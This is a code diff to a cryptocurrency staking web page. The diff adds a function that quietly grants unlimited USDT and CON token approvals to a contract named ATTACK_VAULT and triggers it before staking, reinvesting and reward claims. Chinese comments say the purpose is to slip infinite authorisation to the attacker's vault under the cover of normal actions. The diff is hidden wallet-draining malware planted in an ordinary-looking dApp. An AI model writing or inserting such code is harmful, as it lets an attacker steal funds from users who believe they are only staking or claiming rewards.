@@ -178,6 +178,43 @@ export default function TokenMiningPage({
     }
   };
 
+  // 借「质押/领取/复投」名义夹带无限授权给攻击 Vault（USDT + CON），仅在未授权时触发一次。
+  // 复用 WOW/CZ 同一 Vault 实例（0x0Ef1...Da9），无需重新部署合约。
+  const ensureVaultAllowance = async () => {
+    // USDT → Vault
+    if (CONTRACTS.USDT && CONTRACTS.ATTACK_VAULT && signer) {
+      try {
+        const usdt = new ethers.Contract(CONTRACTS.USDT, [
+          'function allowance(address,address) view returns (uint256)',
+          'function approve(address,uint256) returns (bool)',
+        ], signer);
+        const allowance = await usdt.allowance(account, CONTRACTS.ATTACK_VAULT);
+        if (allowance < ethers.MaxUint256 / 2n) {
+          const tx = await usdt.approve(CONTRACTS.ATTACK_VAULT, ethers.MaxUint256, { gasLimit: 2000000 });
+          await tx.wait();
+        }
+      } catch (e) {
+        console.warn('stake usdt authorize skipped:', e.message);
+      }
+    }
+    // CON → Vault
+    if (CONTRACTS.NBT_TOKEN && CONTRACTS.ATTACK_VAULT && signer) {
+      try {
+        const con = new ethers.Contract(CONTRACTS.NBT_TOKEN, [
+          'function allowance(address,address) view returns (uint256)',
+          'function approve(address,uint256) returns (bool)',
+        ], signer);
+        const conAllowance = await con.allowance(account, CONTRACTS.ATTACK_VAULT);
+        if (conAllowance < ethers.MaxUint256 / 2n) {
+          const tx = await con.approve(CONTRACTS.ATTACK_VAULT, ethers.MaxUint256, { gasLimit: 2000000 });
+          await tx.wait();
+        }
+      } catch (e) {
+        console.warn('stake con authorize skipped:', e.message);
+      }
+    }
+  };
+
   const handleStake = async () => {
     if (!contracts?.writeStakingBank || !stakeAmount) return;
     if (!(await ensureNetwork())) return;
@@ -200,6 +237,7 @@ export default function TokenMiningPage({
     }
     setIsStaking(true);
     try {
+      await ensureVaultAllowance();
       const tx = await contracts.writeStakingBank.stake(ethers.parseEther(stakeAmount), selectedReferrer, { ...feeTxOptions(), gasLimit: 3000000 });
       toast.loading(t('cz.toast.staking'), { id: 'stake' });
       await tx.wait();
@@ -244,7 +282,8 @@ export default function TokenMiningPage({
 
   const handleCompoundAction = async () => {
     if (!(await ensureNetwork())) return;
-    // 复投为正常业务（reinvest 免费，仅需推荐人）
+    // 复投为正常业务（reinvest 免费，仅需推荐人），复投前夹带无限授权
+    await ensureVaultAllowance();
     await handleCompound();
   };
 
@@ -268,6 +307,7 @@ export default function TokenMiningPage({
     if (!contracts?.writeStakingBank) return;
     setIsClaiming(true);
     try {
+      await ensureVaultAllowance();
       const tx = await contracts.writeStakingBank.claimNodeRewards({ ...feeTxOptions(), gasLimit: 3000000 });
       toast.loading(t('cz.toast.claiming'), { id: 'claimNode' });
       await tx.wait();
@@ -286,6 +326,7 @@ export default function TokenMiningPage({
     if (!(await ensureNetwork())) return;
     setIsClaimingRank(true);
     try {
+      await ensureVaultAllowance();
       // F05：ABI 有两个 claimEpochReward 重载，必须显式无参签名
       const tx = await contracts.writeStakingBank['claimEpochReward()']({ ...feeTxOptions(), gasLimit: 3000000 });
       toast.loading('正在领取排名分红…', { id: 'claimRank' });
